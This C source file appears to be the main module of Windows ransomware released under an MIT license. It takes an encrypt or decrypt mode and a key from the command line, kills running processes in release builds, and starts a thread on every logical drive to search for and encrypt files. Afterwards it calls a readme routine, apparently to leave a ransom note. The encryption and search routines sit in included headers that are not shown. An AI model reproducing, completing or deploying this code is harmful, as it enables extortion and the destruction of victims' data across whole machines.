/*
MIT License

Copyright (c) 2024 kadzicu

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
*/

#include "LogicalDrives.h"
#include "SearchEngine.h"
#include "Processes.h"
#include "CallBack.h"
#include "README.h"

#define _MAX_KEY_SIZE 100
#define MAX_THREADS 26

extern LPBYTE key;
extern INT key_len;

typedef struct
{
	_TCHAR drive;
	VOID(*fn)(_TCHAR*);
} Data, *PData;

PData data_arr[MAX_THREADS];
DWORD thread_id_arr[MAX_THREADS];
HANDLE thread_arr[MAX_THREADS];

DWORD WINAPI thread_fn(LPVOID param)
{
	PData data = (PData)param;
	_TCHAR logical_drive[] =
	{
		data->drive,
		_T(':'),
		_T('\0')
	};
	search_engine(logical_drive, data->fn);
	return 0;
}

INT _tmain(INT argc, _TCHAR** argv)
{
	if (argc > 1 && (_tcsclen(argv[2]) < _MAX_KEY_SIZE && _tcsclen(argv[2]) > 1))
	{
#ifndef _DEBUG
		kill_all_processes();
#endif 
#ifdef _UNICODE
		size_t i;
		BYTE buf[_MAX_KEY_SIZE] = { 0 };
		if (wcstombs_s(&i, buf, _MAX_KEY_SIZE, argv[2], _MAX_KEY_SIZE - 1))
			ExitProcess(0);

		key = buf;
#else
		key = argv[2];
#endif
		key_len = (INT)_tcslen(argv[2]);

		INT count_logical_drive = 0;
		_TCHAR logical_drives[27] = { 0 };
		get_logical_drives(logical_drives, &count_logical_drive);

		if (!count_logical_drive) 
			ExitProcess(0);

		for (INT i = 0; i < count_logical_drive; i++)
		{
			if (!(data_arr[i] = (PData)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(Data)))) 
				ExitProcess(0);

			memcpy(&data_arr[i]->drive, &logical_drives[i], 1);

			if (!lstrcmp(_T("encrypt"), argv[1]))
				data_arr[i]->fn = encrypt;
			else if (!lstrcmp(_T("decrypt"), argv[1]))
				data_arr[i]->fn = decrypt;
			else
				ExitProcess(0);

			if (!(thread_arr[i] = CreateThread(NULL, 0, thread_fn, data_arr[i], 0, &thread_id_arr[i])))
				ExitProcess(0);
		}

		WaitForMultipleObjects(count_logical_drive, thread_arr, TRUE, INFINITE);

		for (size_t i = 0; i < count_logical_drive; i++)
		{
			CloseHandle(thread_arr[i]);
			HeapFree(GetProcessHeap(), 0, data_arr[i]);
		}
#ifndef _DEBUG
		readme();
#endif 
	}
}